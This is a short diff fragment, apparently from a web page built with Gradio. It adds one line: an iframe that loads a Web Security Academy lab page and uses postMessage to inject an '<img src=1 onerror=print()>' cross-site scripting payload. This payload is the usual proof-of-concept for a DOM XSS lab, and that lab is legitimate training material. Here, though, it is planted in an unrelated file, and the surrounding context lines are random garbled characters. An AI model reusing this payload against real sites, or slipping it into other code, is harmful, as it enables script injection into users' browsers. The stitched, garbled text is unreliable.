@@ -10,7 +10,7 @@ xt-6+69p8g5Q4"XZY6nz@^d47T]:p
 7F,xt-6+69p8g5Q4"XZY6nz@^d47T]:p1c3
 
 
-
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
 
 <script data-gradio-mode>
 			window.__gradio_mode__ = "app";
